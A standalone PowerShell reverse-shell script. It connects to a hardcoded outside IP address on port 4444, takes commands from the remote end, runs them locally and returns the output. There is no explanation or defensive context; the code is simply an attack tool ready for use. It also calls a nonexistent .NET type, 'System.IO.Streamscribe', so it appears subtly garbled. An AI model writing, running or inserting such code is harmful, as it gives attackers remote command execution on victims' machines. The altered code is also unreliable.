$socket = new-object System.Net.Sockets.TcpClient('4.204.56.232', 4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$scribe = new-object System.IO.Streamscribe($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$scribe.Write("> ");
	$scribe.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split(' ')
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $scribe.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$scribe.close();$socket.close();